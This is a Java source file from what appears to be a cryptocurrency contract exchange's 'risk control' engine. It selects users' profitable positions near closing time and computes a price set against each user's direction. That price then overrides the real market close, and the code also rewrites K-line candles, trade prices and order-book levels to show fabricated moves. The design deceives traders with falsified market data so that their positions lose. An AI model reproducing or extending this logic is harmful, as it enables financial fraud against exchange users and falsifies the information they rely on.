package com.bizzan.bitrade.engine.risk;

import com.bizzan.bitrade.entity.*;
import com.bizzan.bitrade.handler.MarketHandler;
import com.bizzan.bitrade.service.RiskControlService;
import com.bizzan.bitrade.service.RiskStrategyService;
import com.bizzan.bitrade.util.HuobiTime;
import com.bizzan.bitrade.util.MyRandomUtil;
import lombok.Data;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.math.BigDecimal;
import java.util.*;
import java.util.concurrent.CopyOnWriteArrayList;

@Data
public class RiskControl {

    private Logger logger = LoggerFactory.getLogger(RiskControl.class);

    public RiskControl(String symbol, BigDecimal rate) {
        this.symbol = symbol;
        this.rate = rate;
    }

    private RiskControlService riskControlService;  // 风控存储服务
    private RiskStrategyService riskStrategyService; // 风控策略服务
    private String symbol; // 币种
    private BigDecimal rate; // 风控触发概率
    public List<MarketHandler> handlers = new ArrayList<>();  // 行情、概要等处理者
    private List<RiskPeriod> riskPeriods = new CopyOnWriteArrayList<>(); // 当前风控区间池
    private List<RiskPeriod> historyPeriods = new CopyOnWriteArrayList<>(); // 历史风控区间池
    private RiskPeriod currentPeriod; // 当前分控区间
    private BigDecimal currentPrice; // 当前风控价格

    public void setRiskControlService(RiskControlService riskControlService) {
        this.riskControlService = riskControlService;
    }

    public void setRiskStrategyService(RiskStrategyService riskStrategyService) {
        this.riskStrategyService = riskStrategyService;
    }

    /**
     * 激活当前风控数据
     */
    private void startPeriod(BigDecimal price, long now) {
        if (currentPeriod != null) {
            return;
        }
        RiskPeriod searchPeriod = searchAndRemoveInPeriods(now);
        if (searchPeriod == null) {
            return;
        }
        if (searchPeriod.getRiskPrice() == null) { // 有风控价格的区间为强制触发
            // 距离开仓点位判断
            BigDecimal share = BigDecimal.valueOf(searchPeriod.getShare());
            /** 判断是否够条件激活 **/
            // 是否满足最小风控手数
            if (share.abs().compareTo(BigDecimal.valueOf(searchPeriod.getStrategy().getMinShare())) < 0) {
                riskControlService.saveHistory(searchPeriod, false, "当前手数小于最小风控手数：" + share);
                return;
            }
            // 是否满足距离开仓点位
            BigDecimal diffOpenPoint = price.subtract(searchPeriod.getOpenPrice()).divide(searchPeriod.getOpenPrice(), 8, BigDecimal.ROUND_DOWN);
            if (diffOpenPoint.abs().compareTo(searchPeriod.getStrategy().getDiffOpenPointMin()) < 0 || diffOpenPoint.abs().compareTo(searchPeriod.getStrategy().getDiffOpenPointMax()) > 0) { // 盈利不足或盈利超标
                riskControlService.saveHistory(searchPeriod, false, "不满足开仓点位：" + diffOpenPoint);
                return;
            }
            // 判断用户是否已盈利
            Boolean loss = (share.compareTo(BigDecimal.ZERO) > 0 && diffOpenPoint.compareTo(BigDecimal.ZERO) < 0)
                    || (share.compareTo(BigDecimal.ZERO) < 0 && diffOpenPoint.compareTo(BigDecimal.ZERO) >= 0);
            if (loss && (searchPeriod.getStrategy().getProfitAutoClose() || searchPeriod.getStrategy().getAutoClosePoint())) {
                riskControlService.saveHistory(searchPeriod, false, "用户未盈利：" + diffOpenPoint);
                return; // 用户未盈利且开启盈利自动关闭功能不参加风控
            }
            // 获取概率通行证
            if (!getAccess(searchPeriod, price)) {
                riskControlService.saveHistory(searchPeriod, false, "收益权重过滤");
                return;
            }
            /** 判断是否够条件激活 end **/
            BigDecimal riskPrice = getRiskPrice(searchPeriod, share, price);
            searchPeriod.setRiskPrice(riskPrice);
        }
        currentPeriod = searchPeriod;
        // 记录分控价格以便k线使用，内存中保留一份为分钟k线使用(频率过高读取数据库开销大)
        historyPeriods.add(searchPeriod);
        handleAddHistoryRiskPeriod(searchPeriod);
        // 存储mongodb
        riskControlService.saveRisk(symbol, searchPeriod);
    }

    /**
     * 计算风控价格
     *
     * @param searchPeriod
     * @param share
     * @param price
     * @return
     */
    private BigDecimal getRiskPrice(RiskPeriod searchPeriod, BigDecimal share, BigDecimal price) {
        BigDecimal riskPrice;
        BigDecimal openPrice = searchPeriod.getOpenPrice();
        if (searchPeriod.getStrategy().getAutoClosePoint()) { // 自动计算
            return getIntellectPrice(searchPeriod, share, price);
        } else {
            BigDecimal diff = openPrice.multiply(searchPeriod.getStrategy().getDiffClosePoint());
            if (share.compareTo(BigDecimal.ZERO) > 0) { // 多仓为主
                riskPrice = openPrice.subtract(diff);
            } else { // 空仓为主
                riskPrice = openPrice.add(diff);
            }
            return riskPrice;
        }
    }

    /**
     * 智能风控价格
     *
     * @param searchPeriod
     * @param share
     * @param price
     * @return
     */
    private BigDecimal getIntellectPrice(RiskPeriod searchPeriod, BigDecimal share, BigDecimal price) {
        Boolean adjust = false;
        if (share.compareTo(BigDecimal.ZERO) > 0 && price.compareTo(searchPeriod.getOpenPrice()) > 0) {
            adjust = true;
        }

        if (share.compareTo(BigDecimal.ZERO) < 0 && price.compareTo(searchPeriod.getOpenPrice()) < 0) {
            adjust = true;
        }

        return adjust ? searchPeriod.getOpenPrice().subtract(price.subtract(searchPeriod.getOpenPrice())) : price;
    }

    /**
     * 查询临近可合单的风控区间
     *
     * @param closeTime
     * @param aleadys
     * @return
     */
    private RiskPeriod searchAdjoin(long closeTime, List<RiskPeriod> aleadys) {
        for (RiskPeriod aleady : aleadys) {
            if (closeTime > aleady.getStart() && closeTime < aleady.getEnd()) { //包含在区间里
                return aleady;
            }
        }
        return null;
    }

    /**
     * 强制新增控盘区间
     *
     * @param period
     */
    public void addForce(RiskPeriod period) {
        synchronized (riskPeriods) {
            removeInvolvePeriods(period.getStart(), period.getEnd());
            addRiskPeriods(period);
        }
    }

    /**
     * 新增控盘区间，此时只是加入备选，具体触发要看平仓前一段时间价格来确定
     *
     * @param openPrice
     * @param closeTime
     * @param share
     * @param direction
     */
    public void add(Long memberId, BigDecimal openPrice, long closeTime, int share, ContractOrderDirection direction, BigDecimal shareNumber) {
        RiskStrategy strategy = riskStrategyService.findActiveStrategyByMemberId(memberId);
        if (strategy == null) {
            return;
        }
        if (share < strategy.getMinShare()) { // 手数过少不参加风控
            return;
        }
        int longShare = 0;
        int shortShare = 0;
        if (direction == ContractOrderDirection.SELL) {// 空仓:空仓相当于同等价位负手数的多仓
            shortShare = share;
            share = 0 - share;
        } else {
            longShare = share;
        }
        synchronized (riskPeriods) {
            RiskPeriod period;
            List<RiskPeriod> aleadys = searchInvolvePeriods(closeTime - Long.valueOf(strategy.getDiffCloseTime()), closeTime + Long.valueOf(strategy.getResumeTime()));
            if (aleadys.size() > 0) { // 合并
                period = searchAdjoin(closeTime, aleadys); //取适合时间段的合并
                if (period == null) {
                    return; // 无法合并，该风控数据抛弃
                }
                // todo，这里"简化"处理，价格统一存储，为了方便计算，极端情况会出现问题
//            period.setOpenPrice(FormulaUtil.getAvgOpenPrice(period.getOpenPrice(), period.getShare(), openPrice, share));
                period.setShare(share + period.getShare());
                period.setLongShare(period.getLongShare() + longShare);
                period.setShortShare(period.getShortShare() + shortShare);
                period.setElectionStrategy(strategy, share); // 策略竞选
            } else { // 新增风控区间
                period = new RiskPeriod();
                period.setLongShare(longShare);
                period.setShortShare(shortShare);
                period.setShare(share);
                period.setShareNumber(shareNumber);
                period.setOpenPrice(openPrice);
                period.setStart(closeTime - Long.valueOf(strategy.getDiffCloseTime()));
                period.setEnd(closeTime + Long.valueOf(strategy.getResumeTime()));
                period.setStrategy(strategy);
                addRiskPeriods(period);
            }
        }
    }

    private void addRiskPeriods(RiskPeriod period) {
        riskPeriods.add(period);
        Collections.sort(riskPeriods, new RiskPeriod.Compare()); // 确定排序
        handleAddRiskPeriod(period);
    }

    private void removeRiskPeriods(RiskPeriod period) {
        riskPeriods.remove(period);
        handleDelRiskPeriod(period);
    }

    private Boolean getAccess(RiskPeriod period, BigDecimal price) {
        BigDecimal profit = price.subtract(period.getOpenPrice()).multiply(period.getShareNumber()).multiply(BigDecimal.valueOf(period.getShare())).divide(period.getOpenPrice(), 8, BigDecimal.ROUND_DOWN);
        BigDecimal p1 = BigDecimal.ONE.subtract(period.getStrategy().getProfitWeight().divide(profit, 8, BigDecimal.ROUND_DOWN));
        if (p1.compareTo(BigDecimal.ZERO) <= 0) {
            return false;
        }
        logger.info("手数: {}, 收益权重: {}, 预计收益: {}, 收益概率: {}, 风控强度: {}", period.getShare(), period.getStrategy().getProfitWeight(), profit, p1, rate);
        BigDecimal p = p1.multiply(rate); // 加上风控强度
        logger.info("整体概率: {}", p);
        float fl = (float) Math.random();
        logger.info("随机值: {}", fl);
        return BigDecimal.valueOf(fl).compareTo(p) < 0;
    }

    /**
     * 风控获取价格
     *
     * @param price
     * @param now
     * @return
     */
    public BigDecimal fetchRiskPrice(BigDecimal price, long now) {
        if (currentPeriod != null && now <= currentPeriod.getEnd()) {
            BigDecimal riskPrice = currentPeriod.getRiskPrice();
            int min = -20;
            int max = 20;
            int random = MyRandomUtil.getRandom(min, max);
            return riskPrice.add(BigDecimal.valueOf(random).divide(BigDecimal.valueOf(100)));
        }
        currentPeriod = null;
        startPeriod(price, now);
        return null;
    }

    /**
     * 查询某一时间所处的风控区间
     *
     * @param time
     * @param periods(需排序好)
     * @return todo 算法优化
     */
    private RiskPeriod searchInPeriods(long time, List<RiskPeriod> periods) {
        for (RiskPeriod item : periods) {
            if (time > item.getEnd()) {
                continue;
            }
            if (time > item.getStart()) {
                return item;
            }
            break;
        }
        return null;
    }

    /**
     * 查询某一时间所处的风控区间(同时清除数据, 清除2秒前的数据)
     *
     * @param time
     * @return
     */
    private RiskPeriod searchAndRemoveInPeriods(long time) {
        Iterator<RiskPeriod> iterator = riskPeriods.iterator();
        while (iterator.hasNext()) {
            RiskPeriod item = iterator.next();
            if (time > item.getEnd()) {
                removeRiskPeriods(item);
                continue;
            }
            if (time > item.getStart()) {
                removeRiskPeriods(item);
                return item;
            }
            break;
        }
        return null;
    }

    /**
     * 查询某时间段相关的控盘价格
     *
     * @param start
     * @param end
     * @return
     */
    private List<RiskPeriod> searchInvolvePeriods(long start, long end) {
        List<RiskPeriod> re = new ArrayList<>();
        for (RiskPeriod item : riskPeriods) {
            if (start > item.getEnd()) {
                continue;
            }
            if (end > item.getStart()) {
                re.add(item);
            } else {
                break;
            }
        }
        return re;
    }

    /**
     * 删除某时间段相关的冲突区间
     *
     * @param start
     * @param end
     * @return
     */
    private void removeInvolvePeriods(long start, long end) {
        for (RiskPeriod item : riskPeriods) {
            if (start > item.getEnd()) {
                continue;
            }
            if (end > item.getStart()) {
                removeRiskPeriods(item);
            } else {
                break;
            }
        }
    }

    /**
     * 查询某时间段相关的控盘价格(同时清除数据)
     *
     * @param start
     * @param end
     * @return
     */
    private List<RiskPeriod> searchAndRemoveInvolvePeriods(long start, long end) {
        List<RiskPeriod> re = new ArrayList<>();
        Iterator<RiskPeriod> iterator = historyPeriods.iterator();
        while (iterator.hasNext()) {
            RiskPeriod item = iterator.next();
            if (start > item.getEnd()) {
                historyPeriods.remove(item); // 过期删除
                continue;
            }
            if (end > item.getStart()) {
                re.add(item);
            } else {
                break;
            }
        }
        return re;
    }

    /**
     * 设置风控强度
     *
     * @param rate
     */
    public void setRate(BigDecimal rate) {
        this.rate = rate;
    }

    public BigDecimal getRate() {
        return rate;
    }

    /**
     * 推送风控区间的增加
     */
    public void handleAddRiskPeriod(RiskPeriod period) {
        for (MarketHandler storage : handlers) {
            storage.handleAddRiskPeriod(symbol, period);
        }
    }

    /**
     * 推送风控区间的删除
     */
    public void handleDelRiskPeriod(RiskPeriod period) {
        for (MarketHandler storage : handlers) {
            storage.handleDelRiskPeriod(symbol, period);
        }
    }

    /**
     * 推送风控区间的删除
     */
    public void handleAddHistoryRiskPeriod(RiskPeriod period) {
        for (MarketHandler storage : handlers) {
            storage.handleAddHistoryRiskPeriod(symbol, period);
        }
    }

    /**
     * 根据概率返回ture或false
     *
     * @param probability
     * @return
     */
    public Boolean tossCoin(float probability) {
        float fl = (float) Math.random();
        return BigDecimal.valueOf(fl).compareTo(BigDecimal.valueOf(probability)) < 0;
    }

    /**
     * 替换盘口的整数部分
     *
     * @param plateItems
     * @param currentPrice
     */
    private void swithPlateInteger(List<TradePlateItem> plateItems, BigDecimal currentPrice) {
        BigDecimal[] currentPrices = splitDecimal(currentPrice);
        for (TradePlateItem item : plateItems) {
            BigDecimal[] sellPrices = splitDecimal(item.getPrice());
            item.setPrice(currentPrices[0].add(sellPrices[1]));
        }
    }

    /**
     * 替换前几个盘口的整数部分
     *
     * @param plateItems
     * @param currentPrice
     */
    private void swithPartPlatePrice(List<TradePlateItem> plateItems, BigDecimal currentPrice) {
        Random random = new Random();
        int l = random.nextInt(5);
        for (int i = 0; i < l; i++) {
            plateItems.get(i).setPrice(currentPrice);
            plateItems.get(i).setAmount(plateItems.get(i).getAmount().multiply(BigDecimal.TEN));
        }
    }

    /**
     * 拆分整数和小数部分
     *
     * @param value
     * @return
     */
    private BigDecimal[] splitDecimal(BigDecimal value) {
        BigDecimal[] ps = new BigDecimal[2];
        BigDecimal p1 = value.setScale(0, BigDecimal.ROUND_DOWN);
        BigDecimal p2 = value.subtract(p1);
        ps[0] = p1;
        ps[1] = p2;
        return ps;
    }

    /**
     * 风控修饰行情
     *
     * @param thumb
     */
    public void decoratePrice(CoinThumb thumb) {
        long timeInMillis = Calendar.getInstance().getTimeInMillis();
        currentPrice = fetchRiskPrice(thumb.getClose(), timeInMillis / 1000);
        if (currentPrice != null) {
            logger.info("{} --风控价格--{} ", symbol, currentPrice);
            thumb.setClose(currentPrice);// 截断火币信息使用风控数据
        }
    }

    /**
     * 风控数据修饰后的k线
     *
     * @param kline
     */
    public void decorateRiskKline(KLine kline) {
        long start = kline.getTime();
        long divideTime = HuobiTime.getDivideTime(kline.getPeriod());
        long end = start + divideTime;
        List<RiskPeriod> periods;
        if ("1min".equals(kline.getPeriod())) { // 一分钟查内存
//            periods = riskControlService.findInvolveByTime(symbol, start, end);
            periods = searchAndRemoveInvolvePeriods(start, end);
        } else { // 其它查数据库
            periods = riskControlService.findInvolveByTime(symbol, start, end);
        }
        if (periods.size() == 0) {
            return;
        }
        System.out.println("修改前的K线");
        System.out.println(kline);
        for (RiskPeriod period : periods) {
            BigDecimal riskPrice = period.getRiskPrice();
            if (period.getStart() < start && period.getEnd() > start) {
                kline.setOpenPrice(riskPrice);
            } else if (period.getStart() < end && period.getEnd() > end) {
                kline.setClosePrice(riskPrice);
            }
            if (riskPrice.compareTo(kline.getHighestPrice()) > 0) {
                kline.setHighestPrice(riskPrice);
            } else if (riskPrice.compareTo(kline.getLowestPrice()) < 0) {
                kline.setLowestPrice(riskPrice);
            }
        }
        System.out.println("修改后的K线");
        System.out.println(kline);
    }

    /**
     * 修饰交易
     *
     * @param trade
     * @param baseCoinScale
     */
    public void decorateTrade(ContractTrade trade, int baseCoinScale) {
        if (currentPrice != null && tossCoin(0.90f)) {
            trade.setPrice(currentPrice.setScale(baseCoinScale, BigDecimal.ROUND_HALF_UP));
        }
    }

    /**
     * 修饰盘口
     *
     * @param close
     * @param buyPlateItems
     * @param sellPlateItems
     */
    public void decoratePlate(BigDecimal close, List<TradePlateItem> buyPlateItems, List<TradePlateItem> sellPlateItems) {
        if (currentPrice != null) {
            Random random = new Random();

            if (close.compareTo(currentPrice) < 0) { // 模拟上拉
                swithPlateInteger(sellPlateItems, currentPrice);
                swithPartPlatePrice(buyPlateItems, currentPrice);

            }

            if (close.compareTo(currentPrice) > 0) { // 模拟砸盘
                swithPartPlatePrice(sellPlateItems, currentPrice);
            }

        }
    }
}
